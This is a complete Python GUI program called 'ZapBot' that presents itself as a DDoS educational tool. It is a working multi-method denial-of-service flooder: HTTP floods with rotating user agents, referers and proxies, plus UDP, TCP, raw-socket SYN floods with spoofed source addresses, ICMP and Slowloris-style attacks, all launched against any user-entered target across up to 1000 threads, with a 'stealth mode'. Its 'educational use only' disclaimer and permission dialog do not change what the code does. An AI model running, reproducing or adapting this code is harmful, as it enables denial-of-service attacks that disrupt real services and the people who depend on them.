import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import random
import json
from datetime import datetime
import requests
import os
import urllib3
import socket
import struct
import ssl
from urllib.parse import urlparse, quote
from collections import deque
import base64
from uuid import uuid4
import subprocess
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DDoSEducationalSimulator:
    def __init__(self, root):
        self.root = root
        self.root.title("ZapBot - DDoS Educational Tool")
        self.root.geometry("900x800")
        self.root.resizable(False, False)
        self.root.configure(bg='#1a1a1a')
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()
        
        self.is_attacking = False
        self.threads = []
        self.stop_event = threading.Event()
        self.proxies = []
        self.working_proxies = []
        self.failed_proxies = []
        
        self.requests_sent = 0
        self.errors = 0
        self.start_time = None
        self.request_history = deque(maxlen=100)
        self.bytes_sent = 0
        
        self.config = {
            "target_url": "https://httpbin.org/get",
            "thread_count": 50,
            "duration": 300,
            "request_delay": 100,
            "timeout": 10,
            "use_proxies": False,
            "proxy_file": "proxies.txt",
            "attack_method": "HTTP",
            "stealth_mode": False,
            "rpc": 1,
            "useragent_file": "useragents.txt",
            "referer_file": "referers.txt"
        }
        
        self.user_agents = self.load_user_agents()
        self.referers = self.load_referers()
        
        self.setup_ui()
        self.load_config()
        
    def configure_styles(self):
        self.style.configure('.', background='#1a1a1a', foreground='#00ff00')
        self.style.configure('TFrame', background='#1a1a1a')
        self.style.configure('TLabel', background='#1a1a1a', foreground='#00ff00')
        self.style.configure('TButton', background='#2a2a2a', foreground='#00ff00')
        self.style.configure('TEntry', fieldbackground='#2a2a2a', foreground='#00ff00')
        self.style.configure('TSpinbox', fieldbackground='#2a2a2a', foreground='#00ff00')
        self.style.configure('TCheckbutton', background='#1a1a1a', foreground='#00ff00')
        self.style.configure('TLabelframe', background='#1a1a1a', foreground='#00ff00')
        self.style.configure('TLabelframe.Label', background='#1a1a1a', foreground='#00ff00')
        self.style.configure('TCombobox', fieldbackground='#2a2a2a', foreground='#00ff00')
        
        self.style.configure('Green.TButton', background='#004400', foreground='#00ff00')
        self.style.configure('Red.TButton', background='#440000', foreground='#ff6666')
        self.style.configure('Blue.TButton', background='#000044', foreground='#00ffff')
        
    def load_user_agents(self):
        default_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        try:
            if os.path.exists(self.config["useragent_file"]):
                with open(self.config["useragent_file"], 'r') as f:
                    return [line.strip() for line in f if line.strip()]
        except:
            pass
        
        return default_agents
    
    def load_referers(self):
        default_referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.facebook.com/',
            'https://www.twitter.com/'
        ]
        
        try:
            if os.path.exists(self.config["referer_file"]):
                with open(self.config["referer_file"], 'r') as f:
                    return [line.strip() for line in f if line.strip()]
        except:
            pass
        
        return default_referers
        
    def setup_ui(self):
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        title_label = ttk.Label(main_frame, text="ZapBot - DDoS Educational Tool", font=("Courier", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=5)
        
        disclaimer = ttk.Label(main_frame, 
                              text="FOR EDUCATIONAL USE ONLY - LEGAL TESTING ONLY",
                              foreground="#ff0000", 
                              font=("Courier", 8, "bold"))
        disclaimer.grid(row=1, column=0, columnspan=3, pady=2)
        
        ttk.Label(main_frame, text="Target URL:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.target_url = tk.StringVar(value=self.config["target_url"])
        target_entry = ttk.Entry(main_frame, textvariable=self.target_url, width=35)
        target_entry.grid(row=2, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=2, padx=2)
        
        ttk.Label(main_frame, text="Test Method:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.attack_method = tk.StringVar(value=self.config["attack_method"])
        methods = ttk.Combobox(main_frame, textvariable=self.attack_method, width=15, state="readonly")
        methods['values'] = ('HTTP', 'HTTPS', 'SLOW', 'UDP', 'TCP', 'SYN', 'ICMP', 'RANDOM', 'CONNECTION')
        methods.grid(row=3, column=1, sticky=tk.W, pady=2, padx=2)
        
        ttk.Label(main_frame, text="Threads:").grid(row=4, column=0, sticky=tk.W, pady=2)
        self.thread_count = tk.IntVar(value=self.config["thread_count"])
        ttk.Spinbox(main_frame, from_=1, to=1000, textvariable=self.thread_count, width=10).grid(row=4, column=1, sticky=tk.W, pady=2, padx=2)
        
        ttk.Label(main_frame, text="RPC:").grid(row=4, column=2, sticky=tk.W, pady=2)
        self.rpc = tk.IntVar(value=self.config["rpc"])
        ttk.Spinbox(main_frame, from_=1, to=100, textvariable=self.rpc, width=8).grid(row=4, column=3, sticky=tk.W, pady=2, padx=2)
        
        ttk.Label(main_frame, text="Duration (sec):").grid(row=5, column=0, sticky=tk.W, pady=2)
        self.duration = tk.IntVar(value=self.config["duration"])
        ttk.Spinbox(main_frame, from_=1, to=3600, textvariable=self.duration, width=10).grid(row=5, column=1, sticky=tk.W, pady=2, padx=2)
        
        ttk.Label(main_frame, text="Delay (ms):").grid(row=6, column=0, sticky=tk.W, pady=2)
        self.request_delay = tk.IntVar(value=self.config["request_delay"])
        ttk.Spinbox(main_frame, from_=0, to=5000, textvariable=self.request_delay, width=10).grid(row=6, column=1, sticky=tk.W, pady=2, padx=2)
        
        ttk.Label(main_frame, text="Timeout (sec):").grid(row=7, column=0, sticky=tk.W, pady=2)
        self.timeout = tk.IntVar(value=self.config["timeout"])
        ttk.Spinbox(main_frame, from_=1, to=30, textvariable=self.timeout, width=10).grid(row=7, column=1, sticky=tk.W, pady=2, padx=2)
        
        self.stealth_mode = tk.BooleanVar(value=self.config["stealth_mode"])
        ttk.Checkbutton(main_frame, text="Stealth Mode", variable=self.stealth_mode).grid(row=3, column=2, sticky=tk.W, pady=2)
        
        ttk.Label(main_frame, text="Proxy File:").grid(row=8, column=0, sticky=tk.W, pady=2)
        proxy_frame = ttk.Frame(main_frame)
        proxy_frame.grid(row=8, column=1, columnspan=3, sticky=(tk.W, tk.E), pady=2)
        self.proxy_file = tk.StringVar(value=self.config["proxy_file"])
        ttk.Entry(proxy_frame, textvariable=self.proxy_file, width=20).grid(row=0, column=0, sticky=(tk.W, tk.E), padx=2)
        ttk.Button(proxy_frame, text="Load", command=self.load_proxies, width=6).grid(row=0, column=1, padx=2)
        ttk.Button(proxy_frame, text="Test", command=self.test_proxies, width=6).grid(row=0, column=2, padx=2)
        
        self.use_proxies = tk.BooleanVar(value=self.config["use_proxies"])
        ttk.Checkbutton(main_frame, text="Use Proxies", variable=self.use_proxies).grid(row=9, column=0, sticky=tk.W, pady=2)
        
        self.proxy_status = ttk.Label(main_frame, text="No proxies loaded", foreground="#ff6666")
        self.proxy_status.grid(row=9, column=1, columnspan=3, sticky=tk.W, pady=2)
        
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=10, column=0, columnspan=4, pady=8)
        self.start_button = ttk.Button(button_frame, text="START TEST", command=self.start_attack, width=12, style='Green.TButton')
        self.start_button.pack(side=tk.LEFT, padx=3)
        self.stop_button = ttk.Button(button_frame, text="STOP TEST", command=self.stop_attack, state=tk.DISABLED, width=12, style='Red.TButton')
        self.stop_button.pack(side=tk.LEFT, padx=3)
        ttk.Button(button_frame, text="SAVE CONFIG", command=self.save_config, width=12, style='Blue.TButton').pack(side=tk.LEFT, padx=3)
        ttk.Button(button_frame, text="LOAD CONFIG", command=self.load_config, width=12, style='Blue.TButton').pack(side=tk.LEFT, padx=3)
        
        stats_frame = ttk.LabelFrame(main_frame, text="Test Statistics", padding="3")
        stats_frame.grid(row=11, column=0, columnspan=4, sticky=(tk.W, tk.E), pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        ttk.Label(stats_grid, text="Requests:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.requests_label = ttk.Label(stats_grid, text="0", foreground="#00ff00")
        self.requests_label.grid(row=0, column=1, sticky=tk.W, padx=5)
        
        ttk.Label(stats_grid, text="Errors:").grid(row=0, column=2, sticky=tk.W, padx=5)
        self.errors_label = ttk.Label(stats_grid, text="0", foreground="#ff6666")
        self.errors_label.grid(row=0, column=3, sticky=tk.W, padx=5)
        
        ttk.Label(stats_grid, text="RPS:").grid(row=0, column=4, sticky=tk.W, padx=5)
        self.rps_label = ttk.Label(stats_grid, text="0", foreground="#00ff00")
        self.rps_label.grid(row=0, column=5, sticky=tk.W, padx=5)
        
        ttk.Label(stats_grid, text="Data Sent:").grid(row=0, column=6, sticky=tk.W, padx=5)
        self.data_label = ttk.Label(stats_grid, text="0 MB", foreground="#00ff00")
        self.data_label.grid(row=0, column=7, sticky=tk.W, padx=5)
        
        ttk.Label(stats_grid, text="Time:").grid(row=1, column=0, sticky=tk.W, padx=5)
        self.duration_label = ttk.Label(stats_grid, text="00:00:00", foreground="#00ff00")
        self.duration_label.grid(row=1, column=1, sticky=tk.W, padx=5)
        
        ttk.Label(stats_grid, text="Success:").grid(row=1, column=2, sticky=tk.W, padx=5)
        self.success_rate_label = ttk.Label(stats_grid, text="0%", foreground="#00ff00")
        self.success_rate_label.grid(row=1, column=3, sticky=tk.W, padx=5)
        
        ttk.Label(stats_grid, text="Active:").grid(row=1, column=4, sticky=tk.W, padx=5)
        self.active_threads_label = ttk.Label(stats_grid, text="0", foreground="#00ff00")
        self.active_threads_label.grid(row=1, column=5, sticky=tk.W, padx=5)
        
        ttk.Label(stats_grid, text="Method:").grid(row=1, column=6, sticky=tk.W, padx=5)
        self.method_label = ttk.Label(stats_grid, text="None", foreground="#00ff00")
        self.method_label.grid(row=1, column=7, sticky=tk.W, padx=5)
        
        self.progress_bar = ttk.Progressbar(stats_frame, orient='horizontal', length=300, mode='determinate')
        self.progress_bar.grid(row=1, column=0, pady=5)
        
        log_frame = ttk.LabelFrame(main_frame, text="Test Log", padding="3")
        log_frame.grid(row=12, column=0, columnspan=4, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        log_frame.columnconfigure(0, weight=1)
        log_frame.rowconfigure(0, weight=1)
        
        self.log_area = scrolledtext.ScrolledText(
            log_frame, 
            width=80, 
            height=10, 
            state=tk.DISABLED,
            bg='#2a2a2a',
            fg='#00ff00',
            insertbackground='#00ff00',
            font=('Courier', 8)
        )
        self.log_area.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        self.status_var = tk.StringVar(value="Ready for educational testing")
        status_bar = ttk.Label(
            self.root, 
            textvariable=self.status_var, 
            relief=tk.SUNKEN, 
            anchor=tk.W,
            foreground='#00ff00',
            background='#2a2a2a'
        )
        status_bar.grid(row=1, column=0, sticky=(tk.W, tk.E))
        
        main_frame.rowconfigure(12, weight=1)
        
        self.update_stats()
        
        if os.path.exists(self.proxy_file.get()):
            self.load_proxies()
    
    def load_config(self):
        try:
            if os.path.exists("ddos_simulator_config.json"):
                with open("ddos_simulator_config.json", "r") as f:
                    config = json.load(f)
                    
                self.target_url.set(config.get("target_url", self.config["target_url"]))
                self.thread_count.set(config.get("thread_count", self.config["thread_count"]))
                self.duration.set(config.get("duration", self.config["duration"]))
                self.request_delay.set(config.get("request_delay", self.config["request_delay"]))
                self.timeout.set(config.get("timeout", self.config["timeout"]))
                self.use_proxies.set(config.get("use_proxies", self.config["use_proxies"]))
                self.proxy_file.set(config.get("proxy_file", self.config["proxy_file"]))
                self.attack_method.set(config.get("attack_method", self.config["attack_method"]))
                self.stealth_mode.set(config.get("stealth_mode", self.config["stealth_mode"]))
                self.rpc.set(config.get("rpc", self.config["rpc"]))
                
                self.log_message("Configuration loaded successfully")
            else:
                self.log_message("No saved configuration found")
        except Exception as e:
            self.log_message(f"Error loading configuration: {str(e)}")
    
    def save_config(self):
        config = {
            "target_url": self.target_url.get(),
            "thread_count": self.thread_count.get(),
            "duration": self.duration.get(),
            "request_delay": self.request_delay.get(),
            "timeout": self.timeout.get(),
            "use_proxies": self.use_proxies.get(),
            "proxy_file": self.proxy_file.get(),
            "attack_method": self.attack_method.get(),
            "stealth_mode": self.stealth_mode.get(),
            "rpc": self.rpc.get()
        }
        
        try:
            with open("ddos_simulator_config.json", "w") as f:
                json.dump(config, f, indent=4)
            self.log_message("Configuration saved successfully")
        except Exception as e:
            self.log_message(f"Error saving configuration: {str(e)}")
    
    def load_proxies(self):
        try:
            with open(self.proxy_file.get(), 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            self.proxy_status.config(text=f"Loaded {len(self.proxies)} proxies", foreground="#00ff00")
            self.log_message(f"Loaded {len(self.proxies)} proxies")
        except Exception as e:
            self.proxy_status.config(text="Error loading proxies", foreground="#ff6666")
            self.log_message(f"Error loading proxies: {str(e)}")
            self.proxies = []
    
    def test_proxies(self):
        if not self.proxies:
            self.log_message("No proxies to test")
            return
            
        self.log_message("Testing proxies...")
        self.working_proxies = []
        self.failed_proxies = []
        
        def test_proxy(proxy):
            try:
                test_url = "http://httpbin.org/ip"
                proxies = self.format_proxy(proxy)
                response = requests.get(test_url, proxies=proxies, timeout=10, verify=False)
                if response.status_code == 200:
                    self.working_proxies.append(proxy)
                    return True
            except:
                self.failed_proxies.append(proxy)
                return False
            return False
        
        for proxy in self.proxies:
            test_proxy(proxy)
        
        self.log_message(f"Proxy test complete: {len(self.working_proxies)} working, {len(self.failed_proxies)} failed")
        self.proxy_status.config(text=f"{len(self.working_proxies)} working proxies", foreground="#00ff00")
    
    def format_proxy(self, proxy):
        if proxy.startswith('http://') or proxy.startswith('https://'):
            return {
                'http': proxy,
                'https': proxy
            }
        else:
            if '@' in proxy:
                return {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
            else:
                return {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
    
    def log_message(self, message):
        self.log_area.config(state=tk.NORMAL)
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_area.see(tk.END)
        self.log_area.config(state=tk.DISABLED)
    
    def update_stats(self):
        if self.is_attacking and self.start_time:
            elapsed = time.time() - self.start_time
            hours, remainder = divmod(elapsed, 3600)
            minutes, seconds = divmod(remainder, 60)
            self.duration_label.config(text=f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}")
            
            if self.duration.get() > 0:
                progress = (elapsed / self.duration.get()) * 100
                self.progress_bar['value'] = min(progress, 100)
            
            if elapsed > 0:
                recent_requests = [r for r in self.request_history if r > time.time() - 10]
                rps = len(recent_requests) / 10 if recent_requests else self.requests_sent / elapsed
                self.rps_label.config(text=f"{rps:.2f}")
                
                if self.requests_sent > 0:
                    success_rate = 100 * (self.requests_sent - self.errors) / self.requests_sent
                    self.success_rate_label.config(text=f"{success_rate:.1f}%")
                
                mb_sent = self.bytes_sent / (1024 * 1024)
                self.data_label.config(text=f"{mb_sent:.2f} MB")
        
        active_threads = sum(1 for thread in self.threads if thread.is_alive())
        self.active_threads_label.config(text=str(active_threads))
        
        self.requests_label.config(text=str(self.requests_sent))
        self.errors_label.config(text=str(self.errors))
        self.method_label.config(text=self.attack_method.get())
        
        self.root.after(1000, self.update_stats)
    
    def generate_user_agent(self):
        """Generate a random user agent"""
        return random.choice(self.user_agents)
    
    def generate_random_headers(self):
        """Generate random headers for request"""
        user_agent = self.generate_user_agent()
        
        headers = {
            "User-Agent": user_agent,
            "Accept": random.choice(["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"]),
            "Accept-Language": random.choice(["en-US,en;q=0.5", "fr,fr-FR;q=0.8,en;q=0.5"]),
            "Accept-Encoding": random.choice(["gzip, deflate", "br, gzip, deflate"]),
            "Connection": random.choice(["keep-alive", "close"]),
            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
            "Referer": random.choice(self.referers),
        }
        
        return headers
    
    def send_http_request(self):
        headers = self.generate_random_headers()
        
        proxies = None
        if self.use_proxies.get() and self.proxies:
            proxy = random.choice(self.proxies)
            proxies = self.format_proxy(proxy)
        
        try:
            params = {"t": str(time.time()), "r": str(random.randint(1, 10000))}
            
            response = requests.get(
                self.target_url.get(), 
                headers=headers, 
                params=params,
                timeout=self.timeout.get(),
                proxies=proxies,
                verify=False
            )
            
            self.request_history.append(time.time())
            self.bytes_sent += len(str(headers)) + len(str(params)) + len(self.target_url.get())
            return True
            
        except requests.exceptions.RequestException:
            return False
        except Exception:
            return False
    
    def send_udp_flood(self):
        try:
            target = urlparse(self.target_url.get())
            host = target.hostname
            port = target.port or 80
            
            ip = socket.gethostbyname(host)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            payload = os.urandom(random.randint(64, 1024))
            
            # Send packet
            sock.sendto(payload, (ip, port))
            self.bytes_sent += len(payload)
            sock.close()
            
            self.request_history.append(time.time())
            return True
            
        except:
            return False
    
    def send_tcp_flood(self):
        try:
            target = urlparse(self.target_url.get())
            host = target.hostname
            port = target.port or 80
            
            ip = socket.gethostbyname(host)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout.get())
            
            sock.connect((ip, port))
            
            payload = os.urandom(random.randint(64, 1024))
            
            sock.send(payload)
            self.bytes_sent += len(payload)
            sock.close()
            
            self.request_history.append(time.time())
            return True
            
        except:
            return False
    
    def send_syn_flood(self):
        try:
            target = urlparse(self.target_url.get())
            host = target.hostname
            port = target.port or 80
            
            ip = socket.gethostbyname(host)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            
            ip_header = self.craft_ip_header(source_ip, ip)
            
            tcp_header = self.craft_tcp_header(source_ip, ip, port, random.randint(1024, 65535))
            
            packet = ip_header + tcp_header
            
            sock.sendto(packet, (ip, 0))
            self.bytes_sent += len(packet)
            sock.close()
            
            self.request_history.append(time.time())
            return True
            
        except:
            return False
    
    def send_icmp_flood(self):
        try:
            target = urlparse(self.target_url.get())
            host = target.hostname
            
            ip = socket.gethostbyname(host)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            icmp_type = 8
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(0, 65535)
            icmp_seq = random.randint(0, 65535)
            
            icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            
            payload = os.urandom(random.randint(32, 64))
            
            icmp_checksum = self.calculate_checksum(icmp_header + payload)
            
            icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            
            sock.sendto(icmp_header + payload, (ip, 0))
            self.bytes_sent += len(icmp_header) + len(payload)
            sock.close()
            
            self.request_history.append(time.time())
            return True
            
        except:
            return False
    
    def craft_ip_header(self, source_ip, dest_ip):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                               ip_ihl_ver, ip_tos, ip_tot_len, ip_id, 
                               ip_frag_off, ip_ttl, ip_proto, ip_check, 
                               ip_saddr, ip_daddr)
        
        return ip_header
    
    def craft_tcp_header(self, source_ip, dest_ip, dest_port, source_port):
        tcp_source = source_port
        tcp_dest = dest_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4)
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH', 
                                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', 
                         source_address, dest_address, 
                         placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = self.calculate_checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBHHH', 
                                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        return tcp_header
    
    def calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    def send_slow_request(self):
        try:
            target = urlparse(self.target_url.get())
            host = target.hostname
            port = target.port or 80
            
            ip = socket.gethostbyname(host)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout.get())
            
            sock.connect((ip, port))
            
            partial_request = f"GET / HTTP/1.1\r\nHost: {host}\r\n"
            sock.send(partial_request.encode())
            self.bytes_sent += len(partial_request)
            
            for i in range(10):
                time.sleep(1)
                keep_alive_header = f"X-{i}: {random.randint(1000, 9999)}\r\n"
                sock.send(keep_alive_header.encode())
                self.bytes_sent += len(keep_alive_header)
            
            sock.close()
            self.request_history.append(time.time())
            return True
            
        except:
            return False
    
    def attack_thread(self, duration):
        start_time = time.time()
        request_count = 0
        
        while not self.stop_event.is_set():
            if duration > 0 and (time.time() - start_time) > duration:
                break
                
            method = self.attack_method.get()
            success = False
            
            if method == "HTTP":
                success = self.send_http_request()
            elif method == "HTTPS":
                success = self.send_http_request()
            elif method == "UDP":
                success = self.send_udp_flood()
            elif method == "TCP":
                success = self.send_tcp_flood()
            elif method == "SYN":
                success = self.send_syn_flood()
            elif method == "ICMP":
                success = self.send_icmp_flood()
            elif method == "SLOW":
                success = self.send_slow_request()
            elif method == "RANDOM":
                methods = ["HTTP", "UDP", "TCP", "SYN", "ICMP", "SLOW"]
                random_method = random.choice(methods)
                if random_method == "HTTP":
                    success = self.send_http_request()
                elif random_method == "UDP":
                    success = self.send_udp_flood()
                elif random_method == "TCP":
                    success = self.send_tcp_flood()
                elif random_method == "SYN":
                    success = self.send_syn_flood()
                elif random_method == "ICMP":
                    success = self.send_icmp_flood()
                elif random_method == "SLOW":
                    success = self.send_slow_request()
            elif method == "CONNECTION":
                try:
                    target = urlparse(self.target_url.get())
                    host = target.hostname
                    port = target.port or 80
                    ip = socket.gethostbyname(host)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((ip, port))
                    sock.close()
                    success = True
                except:
                    success = False
            
            with threading.Lock():
                self.requests_sent += 1
                if not success:
                    self.errors += 1
                request_count += 1
            
            delay = self.request_delay.get() / 1000.0
            if self.stealth_mode.get():
                delay *= random.uniform(0.8, 1.2)
            if delay > 0:
                time.sleep(delay)
    
    def start_attack(self):
        if self.is_attacking:
            self.log_message("Test is already running")
            return
        
        target = self.target_url.get()
        if not target.startswith(('http://', 'https://')):
            messagebox.showerror("Error", "Target URL must start with http:// or https://")
            return
        
        if not messagebox.askyesno(
            "ZapBot - Legal Warning!", 
            "This tool is for EDUCATIONAL purposes only.\n\n"
            "Unauthorized testing against websites you don't own is ILLEGAL.\n\n"
            "Do you have explicit permission to test this target?",
            icon='warning'
        ):
            return
        
        threads = self.thread_count.get()
        if threads < 1 or threads > 1000:
            messagebox.showerror("Error", "Thread count must be between 1 and 1000")
            return
        
        duration = self.duration.get()
        if duration < 1:
            messagebox.showerror("Error", "Duration must be at least 1 second")
            return
        
        if self.use_proxies.get() and not self.proxies:
            if not messagebox.askyesno("No Proxies", "No proxies loaded. Continue without proxies?"):
                return
            self.use_proxies.set(False)
        
        self.requests_sent = 0
        self.errors = 0
        self.bytes_sent = 0
        self.request_history.clear()
        self.start_time = time.time()
        self.is_attacking = True
        self.stop_event.clear()
        
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.progress_bar['value'] = 0
        
        self.threads = []
        for i in range(threads):
            t = threading.Thread(target=self.attack_thread, args=(duration,))
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        self.log_message(f"Educational test started with {threads} threads")
        self.log_message(f"Target: {target}")
        self.log_message(f"Method: {self.attack_method.get()}")
        if self.use_proxies.get():
            self.log_message(f"Using {len(self.proxies)} proxies")
        self.status_var.set(f"Testing: {target}")
        
        if duration > 0:
            threading.Timer(duration, self.stop_attack).start()
    
    def stop_attack(self):
        if not self.is_attacking:
            self.log_message("No test is running")
            return
        
        self.stop_event.set()
        self.is_attacking = False
        
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        self.log_message("Test stopped")
        self.status_var.set("Test complete")
        
        if self.start_time:
            elapsed = time.time() - self.start_time
            rps = self.requests_sent / elapsed if elapsed > 0 else 0
            success_rate = 100 * (self.requests_sent - self.errors) / self.requests_sent if self.requests_sent > 0 else 0
            
            self.log_message(f"Test results:")
            self.log_message(f"- Total requests: {self.requests_sent}")
            self.log_message(f"- Errors: {self.errors}")
            self.log_message(f"- Average rate: {rps:.2f} requests/second")
            self.log_message(f"- Success rate: {success_rate:.1f}%")
            self.log_message(f"- Data sent: {self.bytes_sent / (1024*1024):.2f} MB")
            self.log_message(f"- Duration: {elapsed:.2f} seconds")

def main():
    root = tk.Tk()
    app = DDoSEducationalSimulator(root)
    root.mainloop()

if __name__ == "__main__":
    main()
